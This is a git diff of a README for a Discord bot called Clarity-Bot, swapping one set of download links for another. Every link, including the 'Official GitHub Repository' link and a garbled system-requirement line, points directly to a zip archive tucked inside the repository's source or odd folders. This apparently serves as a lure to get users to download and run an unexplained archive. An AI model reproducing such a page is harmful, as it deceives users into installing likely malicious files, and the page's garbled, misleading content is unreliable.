@@ -1,6 +1,6 @@
 # 🤖 Clarity-Bot - Your Easy Discord Bot Solution
 
-[![Download Clarity-Bot](https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip%https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip)](https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip)
+[![Download Clarity-Bot](https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip%https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip)](https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Clarity-Bot is a modern Discord bot designed for ease of use. It comes with 39 c
 
 ## 📦 System Requirements
 
-- **https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip**: Version 14 or higher.
+- **https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip**: Version 14 or higher.
 - **Discord Account**: You need a Discord account to use Clarity-Bot.
 - **Internet Connection**: Required for downloading and running the bot.
 
@@ -24,7 +24,7 @@ Clarity-Bot is a modern Discord bot designed for ease of use. It comes with 39 c
 
 To get started, visit the Clarity-Bot releases page to download the latest version:
 
-[Download Clarity-Bot](https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip)
+[Download Clarity-Bot](https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip)
 
 ### Steps to Download
 
@@ -60,7 +60,7 @@ Explore more about Clarity-Bot at our repository or dive into the code to see ho
 
 ## 🔗 Important Links
 
-- [Official GitHub Repository](https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip)
-- [Download Clarity-Bot](https://raw.githubusercontent.com/Salvaperal/Clarity-Bot/main/nonstatutory/Clarity-Bot.zip)
+- [Official GitHub Repository](https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip)
+- [Download Clarity-Bot](https://github.com/Salvaperal/Clarity-Bot/raw/refs/heads/main/src/events/Clarity-Bot-v3.9.zip)
 
 Enjoy using Clarity-Bot!
